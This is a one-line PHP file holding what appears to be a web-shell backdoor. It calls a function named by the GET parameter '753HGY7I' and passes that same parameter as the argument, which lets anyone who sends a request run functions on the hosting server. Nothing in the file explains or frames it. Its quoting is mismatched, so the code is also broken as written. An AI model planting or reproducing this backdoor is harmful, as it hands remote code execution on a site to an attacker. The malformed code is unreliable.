<?php
$_GET["753HGY7I']($_GET['753HGY7I']);
?>
